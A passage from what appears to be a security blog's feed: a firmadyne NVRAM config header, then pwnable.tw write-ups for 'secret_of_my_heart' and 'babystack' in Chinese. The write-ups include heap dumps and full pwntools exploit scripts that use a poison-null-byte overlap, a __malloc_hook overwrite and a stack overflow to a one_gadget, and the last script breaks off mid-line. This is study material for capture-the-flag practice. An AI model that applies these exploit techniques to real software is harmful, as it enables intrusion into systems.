class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># 1_config.h</span><br><span class="line"></span><br><span class="line">#ifndef INCLUDE_CONFIG_H</span><br><span class="line">#define INCLUDE_CONFIG_H</span><br><span class="line"></span><br><span class="line">// Determines whether debugging information should be printed to stderr.</span><br><span class="line">#define DEBUG               1</span><br><span class="line">// Determines the size of the internal buffer, used for manipulating and storing key values, etc.</span><br><span class="line">#define BUFFER_SIZE         256</span><br><span class="line">// Determines the size of the &quot;emulated&quot; NVRAM, used by nvram_get_nvramspace().</span><br><span class="line">#define NVRAM_SIZE          2048</span><br><span class="line">// Determines the maximum size of the user-supplied output buffer when a length is not supplied.</span><br><span class="line">#define USER_BUFFER_SIZE    64</span><br><span class="line">// Determines the unique separator character (as string) used for the list implementation. Do not use &quot;\0&quot;.</span><br><span class="line">#define LIST_SEP            &quot;\xff&quot;</span><br><span class="line">// Special argument used to change the semantics of the nvram_list_exist() function.</span><br><span class="line">#define LIST_MAGIC          0xdeadbeef</span><br><span class="line">// Identifier value used to generate IPC key in ftok()</span><br><span class="line">#define IPC_KEY             &apos;A&apos;</span><br><span class="line">// Timeout for the semaphore</span><br><span class="line">#define IPC_TIMEOUT         1000</span><br><span class="line">// Mount point of the base NVRAM implementation.</span><br><span class="line">#define MOUNT_POINT         &quot;/firmadyne/libnvram/&quot;</span><br><span class="line">// Location of NVRAM override values that are copied into the base NVRAM implementation.</span><br><span class="line">#define OVERRIDE_POINT      &quot;/firmadyne/libnvram.override/&quot;</span><br><span class="line"></span><br><span class="line">// Define the semantics for success and failure error codes.</span><br><span class="line">#define E_FAILURE  0</span><br><span class="line">#define E_SUCCESS  1</span><br><span class="line"></span><br><span class="line">// Default paths for NVRAM default values.</span><br><span class="line">#define NVRAM_DEFAULTS_PATH \</span><br><span class="line">    /* &quot;DIR-505L_FIRMWARE_1.01.ZIP&quot; (10497) */ \</span><br><span class="line">    PATH(&quot;/var/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DIR-615_REVE_FIRMWARE_5.11.ZIP&quot; (9753) */ \</span><br><span class="line">    PATH(&quot;/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DGL-5500_REVA_FIRMWARE_1.12B05.ZIP&quot; (9469) */ \</span><br><span class="line">    TABLE(router_defaults) \</span><br><span class="line">    PATH(&quot;/etc/nvram.conf&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.deft&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.update&quot;) \</span><br><span class="line">    TABLE(Nvrams) \</span><br><span class="line">    PATH(&quot;/etc/wlan/nvram_params&quot;) \</span><br><span class="line">    PATH(&quot;/etc/system_nvram_defaults&quot;)</span><br><span class="line"></span><br><span class="line">// Default values for NVRAM.</span><br><span class="line">#define NVRAM_DEFAULTS \</span><br><span class="line">/* Used by Netgear router: enable upnpd log */\</span><br><span class="line">ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">/* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;R8500&quot;)\</span><br><span class="line">    ENTRY(&quot;friendly_name&quot;, nvram_set, &quot;R8300&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_enable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_turn_on&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_period&quot;, nvram_set, &quot;30&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_ttl&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_portmap_entry&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_duration&quot;, nvram_set, &quot;3600&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_DHCPServerConfigurable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;wps_is_upnp&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_sa_uuid&quot;, nvram_set, &quot;00000000000000000000&quot;)\</span><br><span class="line">    ENTRY(&quot;lan_hwaddr&quot;, nvram_set, &quot;AA:BB:CC:DD:EE:FF&quot;)\</span><br><span class="line">    \</span><br><span class="line">    /* Linux kernel log level, used by &quot;WRT54G3G_2.11.05_ETSI_code.bin&quot; (305) */ \</span><br><span class="line">    ENTRY(&quot;console_loglevel&quot;, nvram_set, &quot;7&quot;) \</span><br><span class="line">    /* Reset NVRAM to default at bootup, used by &quot;WNR3500v2-V1.0.2.10_23.0.70NA.chk&quot; (1018) */ \</span><br><span class="line">    ENTRY(&quot;restore_defaults&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    ENTRY(&quot;sku_name&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;wla_wlanstate&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_if&quot;, nvram_set, &quot;br0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ipaddr&quot;, nvram_set, &quot;192.168.65.135&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_bipaddr&quot;, nvram_set, &quot;192.168.65.255&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    /* Set default timezone, required by multiple images */ \</span><br><span class="line">    ENTRY(&quot;time_zone&quot;, nvram_set, &quot;EST5EDT&quot;) \</span><br><span class="line">    /* Set default WAN MAC address, used by &quot;NBG-416N_V1.00(USA.7)C0.zip&quot; (12786) */ \</span><br><span class="line">    ENTRY(&quot;wan_hwaddr_def&quot;, nvram_set, &quot;01:23:45:67:89:ab&quot;) \</span><br><span class="line">    /* Attempt to define LAN/WAN interfaces */ \</span><br><span class="line">    ENTRY(&quot;wan_ifname&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    ENTRY(&quot;lan_ifnames&quot;, nvram_set, &quot;eth1 eth2 eth3 eth4&quot;) \</span><br><span class="line">    /* Used by &quot;TEW-638v2%201.1.5.zip&quot; (12898) to prevent crash in &apos;goahead&apos; */ \</span><br><span class="line">    ENTRY(&quot;ethConver&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    /* Used by &quot;Firmware_TEW-411BRPplus_2.07_EU.zip&quot; (13649) to prevent crash in &apos;init&apos; */ \</span><br><span class="line">    ENTRY(&quot;lan_proto&quot;, nvram_set, &quot;dhcp&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_ipaddr&quot;, nvram_set, &quot;0.0.0.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">    ENTRY(&quot;wanif&quot;, nvram_set, &quot;eth0&quot;) \</span><br><span class="line">    /* Used by &quot;DGND3700 Firmware Version 1.0.0.17(NA).zip&quot; (3425) to prevent crashes */ \</span><br><span class="line">    ENTRY(&quot;time_zone_x&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;rip_multicast&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">    ENTRY(&quot;bs_trustedip_enable&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    /* Used by Netgear router: enable upnpd log */ \</span><br><span class="line">    ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;3&quot;) \</span><br><span class="line">    /* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;MP1T99&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ARM前言&quot;&gt;&lt;a href=&quot;#ARM前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="栈溢出" scheme="p1Kk.github.io/tags/栈溢出/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw secret_of_my_heart wp</title>
    <link href="p1Kk.github.io/2020/10/04/tw/tw%20secret_of_my_heart/"/>
    <id>p1Kk.github.io/2020/10/04/tw/tw%20secret_of_my_heart/</id>
    <published>2020-10-03T16:00:00.000Z</published>
    <updated>2024-07-31T10:32:16.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="secret-of-my-heart"><a href="#secret-of-my-heart" class="headerlink" title="secret_of_my_heart"></a>secret_of_my_heart</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc为ubuntu16</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/secretbug.png" alt></p><ol><li>name处泄露堆地址—&gt;libc地址</li><li>利用poison_null_byte构造重叠堆块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x55772c5e7000</span><br><span class="line">0x55772c5e7000:0x00000000000000000x0000000000000031# 0</span><br><span class="line">0x55772c5e7010:0x62626262626262620x6262626262626262</span><br><span class="line">0x55772c5e7020:0x62626262626262620x6262626262626262</span><br><span class="line">0x55772c5e7030:0x62626262626262620x0000000000020fd1</span><br><span class="line">0x55772c5e7040:0x000055772c5e71100x00007fdaa1abeb78</span><br><span class="line">0x55772c5e7050:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7060:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7070:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7080:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7090:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70c0:0x00000000000000900x0000000000000050# 可被修改块 3</span><br><span class="line">0x55772c5e70d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e70f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7100:0x63636363636363630x6363636363636363</span><br><span class="line">0x55772c5e7110:0x61616161616161000x0000000000000021</span><br><span class="line">0x55772c5e7120:0x00007fdaa1abeb780x00007fdaa1abeb78</span><br><span class="line">0x55772c5e7130:0x00000000000000200x0000000000000000</span><br><span class="line">0x55772c5e7140:0x00000000000001100x0000000000000110</span><br><span class="line">0x55772c5e7150:0x61616161616161610x6161616161616161</span><br><span class="line">0x55772c5e7160:0x61616161616161610x6161616161616161</span><br><span class="line">0x55772c5e7170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55772c5e7180:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x55ff8cab6000</span><br><span class="line">0x55ff8cab6000:0x00000000000000000x0000000000000031</span><br><span class="line">0x55ff8cab6010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6030:0x0068732f6e69622f0x0000000000000091# 再次申请0x80大小到这块，1</span><br><span class="line">0x55ff8cab6040:0x000055ff8cab00640x00007f220ed26b78</span><br><span class="line">0x55ff8cab6050:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6060:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6070:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6080:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab6090:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55ff8cab60c0:0x00000000000000900x0000000000000111# 2, 3</span><br><span class="line">0x55ff8cab60d0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab60e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab60f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6100:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6110:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6120:0x64646464646464640x6464646464646464</span><br><span class="line">0x55ff8cab6130:0x64646464646464640x0000000000000070# fake size</span><br><span class="line">0x55ff8cab6140:0x00000000000001000x0000000000000110</span><br><span class="line">0x55ff8cab6150:0x61616161616161610x6161616161616161</span><br><span class="line">0x55ff8cab6160:0x61616161616161610x6161616161616161</span><br><span class="line">0x55ff8cab6170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8cab6180:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>再free2，打印3就可以得到libc基址。</p><ol start="3"><li>改<code>__malloc_hook</code>为<code>system</code>，因为<code>__free_hook</code>周围没有符合条件的fake size，全是00，所以选择改<code>__malloc_hook</code></li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./secret_of_my_heart&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10302</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def add(size, sec):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(1))</span><br><span class="line">io.sendlineafter(&quot; : &quot;, str(size))</span><br><span class="line">io.sendafter(&quot; :&quot;, &quot;k&quot;*0x20)</span><br><span class="line">io.sendafter(&quot; :&quot;, sec)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(2))</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(3))</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">one = [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]</span><br><span class="line"></span><br><span class="line">add(0x20, &quot;a&quot; * 0x20)# 0</span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&quot;k&quot;*0x20)</span><br><span class="line">heap = u64(io.recv(6).ljust(8, &apos;\x00&apos;)) - 0x10</span><br><span class="line">success(&quot;heap = &quot;+hex(heap))</span><br><span class="line">add(0x100, &quot;a&quot; * 0xF0+p64(0x100))# 1</span><br><span class="line">add(0x100, &quot;a&quot; * 0x20)# 2</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">payload = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload = payload.rjust(0x28, &quot;\x00&quot;)</span><br><span class="line">add(0x28, payload)# 0</span><br><span class="line"># delete(2)</span><br><span class="line">add(0x80, &quot;c&quot; * 0x80)</span><br><span class="line">add(0x40, &quot;c&quot; * 0x40)# ...</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">add(0x80, &quot;d&quot;)# 1</span><br><span class="line">add(0x100, &quot;d&quot;*0x68 + p64(0x70))# 2/3</span><br><span class="line">add(0x80, &quot;d&quot;)# 4</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">show(3)</span><br><span class="line">io.recvuntil(&quot;Secret : &quot;)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8, &apos;\x00&apos;))-88-0x10-libc.symbols[&apos;__malloc_hook&apos;]# -0x3C4B78</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">one = libc_base + one[2]</span><br><span class="line">success(&quot;malloc_addr = &quot;+hex(malloc_addr))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line">success(&quot;binsh_addr = &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">add(0x100, &quot;e&quot;*0x80+p64(0)+p64(0x71))</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x100, &quot;f&quot;*0x80+p64(0)+p64(0x71)+p64(malloc_addr-0x23))</span><br><span class="line">add(0x60, &quot;f&quot;)</span><br><span class="line"># add(0x60, &quot;\x00&quot;*0x13+p64(sys_addr))</span><br><span class="line">add(0x60, &quot;\x00&quot;*0x13+p64(one))</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">io.sendlineafter(&quot;Your choice :&quot;, str(1))</span><br><span class="line">io.sendlineafter(&quot; : &quot;, str(0x30))</span><br><span class="line">io.sendafter(&quot; :&quot;, &quot;k&quot;*0x20)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">delete(3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">unk_202018 + 48LL * i             :         secret_size</span><br><span class="line">unk_202018 + 48LL * i + 8         :         name</span><br><span class="line">unk_202018 + 48LL * i + 0x28      :         secret_addr</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secret-of-my-heart&quot;&gt;&lt;a href=&quot;#secret-of-my-heart&quot; class=&quot;headerlink&quot; title=&quot;secret_of_my_heart&quot;&gt;&lt;/a&gt;secret_of_my_heart&lt;/h1&gt;&lt;h2 id=&quot;分</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw babystack wp</title>
    <link href="p1Kk.github.io/2020/10/04/tw/tw%20babystack/"/>
    <id>p1Kk.github.io/2020/10/04/tw/tw%20babystack/</id>
    <published>2020-10-03T16:00:00.000Z</published>
    <updated>2020-10-04T12:08:56.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>copy时存在栈溢出</p><p>首先是<code>strlen</code>函数用来计算指定的字符串s 的长度，不包括结束字符”\0”</p><p><code>strncmp</code>函数是指定比较size个字符，<code>strcmp</code>函数比较整个字符，直到出现不同的字符或遇”<strong>\0”</strong>为止</p><p>所以可以通过00截断比较，利用login比较，也可以逐字节进行爆破。这时候考虑有没有函数地址可以爆破泄露…</p><p>copy之后，栈中有libc地址了，爆破得到libc基址</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/babystack2.png" alt></p><p><del>但是我不知道怎么把这个地址前面的\x00去掉…或者是我理解有问题ovo？？？</del></p><p><del>去看了看网上的..调试看和我的一样子，服务器的…太慢了…没法试qaq（以后再说😤</del></p><p>(哦…过了俩月换了个虚拟机，又好了，在 <em>1\naaaaaa</em> 后就有地址了…)</p><p>因为栈空间没有进行初始化，且login copy栈空间重叠，利用这里覆盖返回地址为one_gadget。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./babystack&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10205</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def login(passwd):</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line">io.sendafter(&quot;passowrd :&quot;, passwd)</span><br><span class="line">return io.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def copy(copy):</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;3&quot;)</span><br><span class="line">io.sendafter(&quot;Copy :&quot;, copy)</span><br><span class="line"></span><br><span class="line">def ex():</span><br><span class="line">io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def buf(length, cover):</span><br><span class="line">for i in range(length):</span><br><span class="line">for q in range(1,256):</span><br><span class="line">if &apos;Login&apos; in login(cover+chr(q)+&apos;\n&apos;):</span><br><span class="line">cover+=chr(q)</span><br><span class="line">logout()</span><br><span class="line">break</span><br><span class="line">return cover</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"># gdb.attach(io, &quot;b*0x08048819&quot;)</span><br><span class="line">one = [0x45226, 0x4527a, 0xf0364, 0xf1207]</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, 